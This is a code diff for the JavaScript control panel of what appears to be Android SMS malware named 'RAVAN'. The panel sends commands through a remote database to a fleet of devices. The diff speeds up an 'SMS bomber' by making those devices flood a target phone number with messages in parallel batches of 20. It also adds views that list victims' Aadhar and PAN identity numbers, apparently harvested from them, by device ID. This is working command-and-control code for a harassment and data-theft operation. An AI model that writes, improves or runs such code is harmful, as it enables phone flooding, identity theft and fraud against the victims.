@@ -71,20 +71,28 @@ document.addEventListener('DOMContentLoaded', () => {
     // Auto-fetch devices on first load (Moved to selectServer)
     // fetchDevices();
 });
-
-function selectServer(url, name) {
+function selectServer(url, name = 'RAVAN') {
     FB_URL = url;
     document.getElementById('serverModal').classList.add('hidden');
-    if (name) {
-        document.getElementById('headerServerName').innerText = name;
+    
+    // Update Header Name with animation and emoji
+    const headerName = document.getElementById('headerServerName');
+    if (headerName) {
+        const emojis = ['🚀', '⚡', '🔥', '👑', '💎', '✨', '🌟', '💥'];
+        const emoji = emojis[Math.floor(Math.random() * emojis.length)];
+        headerName.innerHTML = `${name.toUpperCase()} ${emoji}`;
+        
+        // Retrigger animation
+        headerName.style.animation = 'none';
+        headerName.offsetHeight; /* trigger reflow */
+        headerName.style.animation = 'gradientText 4s linear infinite';
     }
+    
     fetchDevices();
 }
-
 function logout() {
     FB_URL = "";
     document.getElementById('serverModal').classList.remove('hidden');
-    document.getElementById('headerServerName').innerText = 'RAVAN';
     
     // Clear data
     state.devices = [];
@@ -128,6 +136,9 @@ function autoFetchForTab(tabName) {
             break;
         case 'bomber':
             updateBomberDeviceInfo();
+            break;
+        case 'pages':
+            fetchPagesData();
             break;
     }
 }
@@ -601,28 +612,33 @@ async function startBomber() {
             const empty = document.getElementById('bomberLogEmpty');
             if (empty) empty.style.display = 'none';
 
-            // Send from all sequentially to avoid overwhelming network instantly
-            for (let i = 0; i < activeDevices.length; i++) {
-                const devId = activeDevices[i];
-                setStatus(`Sending ${i + 1}/${activeDevices.length}…`, 'loading');
-                try {
-                    const r = await fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`, {
-                        method: 'PATCH',
-                        body: JSON.stringify({
-                            command: "send message",
-                            phoneNumber: target,
-                            messageText: message,
-                            simSlot: state.bomberSim,
-                            targetDeviceId: devId
-                        }),
-                        headers: { 'Content-Type': 'application/json' },
-                    });
-                    if (r.ok) { okCount++; addBomberLog(i + 1, devId, true, 'Sent Normal (ALL)'); } 
-                    else { failCount++; addBomberLog(i + 1, devId, false, 'Failed Normal (ALL)'); }
-                } catch (e) {
-                    failCount++;
-                    addBomberLog(i + 1, devId, false, 'Error Normal (ALL)');
-                }
+            // Send from all devices in parallel batches of 20 for max speed
+            const BATCH_SIZE = 20;
+            for (let b = 0; b < activeDevices.length; b += BATCH_SIZE) {
+                const batch = activeDevices.slice(b, b + BATCH_SIZE);
+                setStatus(`Sending batch ${Math.floor(b / BATCH_SIZE) + 1}… (${b}/${activeDevices.length})`, 'loading');
+                const results = await Promise.allSettled(
+                    batch.map((devId, idx) => {
+                        const globalIdx = b + idx + 1;
+                        return fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`, {
+                            method: 'PATCH',
+                            body: JSON.stringify({
+                                command: "send message",
+                                phoneNumber: target,
+                                messageText: message,
+                                simSlot: state.bomberSim,
+                                targetDeviceId: devId
+                            }),
+                            headers: { 'Content-Type': 'application/json' },
+                        }).then(r => {
+                            if (r.ok) { okCount++; addBomberLog(globalIdx, devId, true, 'Sent Normal (ALL)'); }
+                            else { failCount++; addBomberLog(globalIdx, devId, false, 'Failed Normal (ALL)'); }
+                        }).catch(() => {
+                            failCount++;
+                            addBomberLog(globalIdx, devId, false, 'Error Normal (ALL)');
+                        });
+                    })
+                );
             }
             showToast(`Done! Sent: ${okCount}, Failed: ${failCount}`, okCount > 0 ? 'success' : 'error');
         } else {
@@ -680,50 +696,53 @@ async function startBomber() {
     setStatus('Bombing…', 'loading');
     let sent = 0, failed = 0;
 
-    for (let i = 0; i < count; i++) {
+    // Fire in parallel batches of 20 for maximum speed
+    const BOMB_BATCH = 20;
+    for (let b = 0; b < count; b += BOMB_BATCH) {
         if (state.bomberAbort) break;
 
-        // Round-robin device selection
-        const devId = activeDevices[i % activeDevices.length];
-        const payload = {
-            command: "send message",
-            phoneNumber: target,
-            messageText: message,
-            simSlot: state.bomberSim,
-            targetDeviceId: devId,
-        };
-
-        try {
-            const r = await fetch(`${FB_URL}/${DATA_PATH}/${devId}.json`, {
-                method: 'PATCH',
-                body: JSON.stringify(payload),
-                headers: { 'Content-Type': 'application/json' },
-            });
-            if (r.ok) {
-                sent++;
-                addBomberLog(i + 1, devId, true);
-            } else {
-                failed++;
-                addBomberLog(i + 1, devId, false);
-            }
-        } catch (e) {
-            failed++;
-            addBomberLog(i + 1, devId, false);
+        const batchEnd = Math.min(b + BOMB_BATCH, count);
+        const batchItems = [];
+        for (let i = b; i < batchEnd; i++) {
+            batchItems.push({ idx: i, devId: activeDevices[i % activeDevices.length] });
         }
 
-        // Update counters
+        setStatus(`Bombing batch ${Math.floor(b / BOMB_BATCH) + 1}… (${b}/${count})`, 'loading');
+
+        await Promise.allSettled(
+            batchItems.map(item => {
+                const payload = {
+                    command: "send message",
+                    phoneNumber: target,
+                    messageText: message,
+                    simSlot: state.bomberSim,
+                    targetDeviceId: item.devId,
+                };
+                return fetch(`${FB_URL}/${DATA_PATH}/${item.devId}.json`, {
+                    method: 'PATCH',
+                    body: JSON.stringify(payload),
+                    headers: { 'Content-Type': 'application/json' },
+                }).then(r => {
+                    if (r.ok) { sent++; addBomberLog(item.idx + 1, item.devId, true); }
+                    else { failed++; addBomberLog(item.idx + 1, item.devId, false); }
+                }).catch(() => {
+                    failed++;
+                    addBomberLog(item.idx + 1, item.devId, false);
+                });
+            })
+        );
+
+        // Update counters after each batch
         document.getElementById('bomberSentCount').textContent = sent;
         document.getElementById('bomberFailCount').textContent = failed;
 
-        const pct = Math.round(((i + 1) / count) * 100);
-        document.getElementById('bomberProgressText').textContent = `${i + 1} / ${count}`;
+        const pct = Math.round((batchEnd / count) * 100);
+        document.getElementById('bomberProgressText').textContent = `${batchEnd} / ${count}`;
         document.getElementById('bomberProgressPercent').textContent = `${pct}%`;
         document.getElementById('bomberProgressFill').style.width = `${pct}%`;
 
-        setStatus(`Bombing ${i + 1}/${count}…`, 'loading');
-
-        // Delay
-        if (delay > 0 && i < count - 1 && !state.bomberAbort) {
+        // Tiny delay between batches only if user set delay > 0
+        if (delay > 0 && batchEnd < count && !state.bomberAbort) {
             await new Promise(resolve => setTimeout(resolve, delay));
         }
     }
@@ -766,6 +785,8 @@ async function openSheet(devId, extra = '') {
 
     const detailEl = document.getElementById('sheetSmsDetail');
     if (detailEl) detailEl.style.display = 'none';
+    const moreDetailsEl = document.getElementById('sheetMoreDetails');
+    if (moreDetailsEl) { moreDetailsEl.style.display = 'none'; moreDetailsEl.innerHTML = ''; }
 
     populateSenderDropdowns();
 
@@ -875,6 +896,8 @@ function closeSheet() {
     }
     state.currentSheetDevId = null;
     document.getElementById('deviceSheet').classList.remove('active');
+    const moreDetailsEl = document.getElementById('sheetMoreDetails');
+    if (moreDetailsEl) { moreDetailsEl.style.display = 'none'; moreDetailsEl.innerHTML = ''; }
     document.body.style.overflow = '';
 }
 
@@ -960,4 +983,119 @@ function esc(text) {
     const d = document.createElement('div');
     d.textContent = text;
     return d.innerHTML;
+}
+
+
+// ---- Pages Data Logic ----
+async function fetchPagesData() {
+    if (!FB_URL) return showToast('Select a server first', 'error');
+    const pagesList = document.getElementById('pagesList');
+    setStatus('Fetching Pages...', 'loading');
+    
+    try {
+        const pagesToFetch = ['page2'];
+        let html = '';
+        
+        for (const page of pagesToFetch) {
+            const r = await fetch(`${FB_URL}/${page}.json`);
+            const data = await r.json();
+            
+            if (data && Object.keys(data).length > 0) {
+                for (const [id, info] of Object.entries(data)) {
+                    if (page === 'page2') {
+                        // Special Page 2 Card with Aadhar/PAN logic
+                        // Swap Aadhar and PAN mapping as requested
+                        let aadhar = info.pan || info.Pan || info.PAN || 'N/A';
+                        let pan = info.aadhar || info.Aadhar || info.AADHAR || 'N/A';
+                        
+                        html += `<div onclick="openSheet('${id}')" style="background:rgba(255,255,255,0.95); margin-bottom: 16px; padding:20px; border-radius:18px; border:1px solid rgba(255,255,255,0.9); box-shadow:0 8px 30px rgba(0,0,0,0.08); cursor:pointer; transition:all 0.2s; width: 100%; box-sizing: border-box;" onmousedown="this.style.transform='scale(0.96)'; this.style.boxShadow='0 4px 15px rgba(0,0,0,0.05)';" onmouseup="this.style.transform='scale(1)'; this.style.boxShadow='0 8px 30px rgba(0,0,0,0.08)';" ontouchstart="this.style.transform='scale(0.96)'; this.style.boxShadow='0 4px 15px rgba(0,0,0,0.05)';" ontouchend="this.style.transform='scale(1)'; this.style.boxShadow='0 8px 30px rgba(0,0,0,0.08)';">
+                            <strong style="color:var(--text); font-size:1.05rem; display:block; margin-bottom:16px; padding-bottom:12px; border-bottom:1px dashed rgba(0,0,0,0.1); word-break: break-all;">ID: ${id}</strong>
+                            
+                            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
+                                <div style="display:flex; align-items:center; gap:10px;">
+                                    <span style="font-size:1.4rem;">🪪</span>
+                                    <span style="color:var(--text-2); font-size:0.85rem; font-weight:800; text-transform:uppercase; letter-spacing: 0.5px;">Aadhar</span>
+                                </div>
+                                <span style="color:var(--green); font-family:monospace; font-weight:800; font-size:1.05rem;">${esc(String(aadhar))}</span>
+                            </div>
+                            
+                            <div style="display:flex; justify-content:space-between; align-items:center;">
+                                <div style="display:flex; align-items:center; gap:10px;">
+                                    <span style="font-size:1.4rem;">💳</span>
+                                    <span style="color:var(--text-2); font-size:0.85rem; font-weight:800; text-transform:uppercase; letter-spacing: 0.5px;">PAN Card</span>
+                                </div>
+                                <span style="color:var(--blue); font-family:monospace; font-weight:800; font-size:1.05rem;">${esc(String(pan))}</span>
+                            </div>
+                        </div>`;
+                    } else {
+                        // Standard Rendering for other pages
+                        html += `<div style="background:rgba(255,255,255,0.6); padding:12px; border-radius:8px; border:1px solid rgba(0,0,0,0.05);">
+                            <strong style="color:var(--text); font-size:0.85rem; display:block; margin-bottom:8px;">ID: ${id}</strong>`;
+                        for (const [k, v] of Object.entries(info)) {
+                            html += `<div style="display:flex; justify-content:space-between; font-size:0.8rem; padding:4px 0; border-bottom:1px solid rgba(0,0,0,0.03);">
+                                <span style="color:var(--text-2); text-transform:capitalize;">${k}</span>
+                                <span style="color:var(--green); font-family:monospace; font-weight:bold;">${esc(String(v))}</span>
+                            </div>`;
+                        }
+                        html += `</div>`;
+                    }
+                }
+            }
+        }
+        
+        if (html === '') {
+            html = `<div class="empty-state" style="padding:30px 0;"><p>No Data Available</p></div>`;
+        }
+        
+        pagesList.innerHTML = html;
+        setStatus('Pages Loaded');
+        showToast('Pages data updated', 'success');
+        
+    } catch (e) {
+        setStatus('Error fetching pages', 'error');
+        showToast('Error: ' + e.message, 'error');
+    }
+}
+
+
+// ---- Fetch Device More Details ----
+async function fetchDeviceMoreDetails() {
+    const devId = state.currentSheetDevId;
+    if (!devId) return;
+    
+    const moreDetailsEl = document.getElementById('sheetMoreDetails');
+    moreDetailsEl.style.display = 'block';
+    moreDetailsEl.innerHTML = '<div style="color:var(--sub); text-align:center;">Fetching details...</div>';
+    
+    try {
+        const pagesToFetch = ['page2'];
+        let html = '';
+        
+        for (const page of pagesToFetch) {
+            const r = await fetch(`${FB_URL}/${page}/${devId}.json`);
+            const data = await r.json();
+            
+            if (data && Object.keys(data).length > 0 && typeof data === 'object') {
+                html += `<div style="margin-bottom: 10px;">
+                    <strong style="color:var(--emerald); font-size: 0.9rem; display:block; margin-bottom: 5px;">${page.toUpperCase()}</strong>`;
+                for (const [k, v] of Object.entries(data)) {
+                    html += `<div style="display:flex; justify-content:space-between; font-size:0.8rem; padding:3px 0; border-bottom:1px solid rgba(255,255,255,0.05);">
+                        <span style="color:var(--sub);">${k}</span>
+                        <span style="color:var(--text); font-family:monospace; font-weight:bold; word-break:break-all; max-width:60%; text-align:right;">${esc(String(v))}</span>
+                    </div>`;
+                }
+                html += `</div>`;
+            }
+        }
+        
+        if (html === '') {
+            html = '<div style="color:var(--sub); text-align:center;">No extra details found in pages.</div>';
+        }
+        
+        moreDetailsEl.innerHTML = html;
+        showToast('Extra details loaded', 'success');
+    } catch(e) {
+        moreDetailsEl.innerHTML = '<div style="color:var(--red); text-align:center;">Failed to fetch details</div>';
+        showToast(e.message, 'error');
+    }
 }
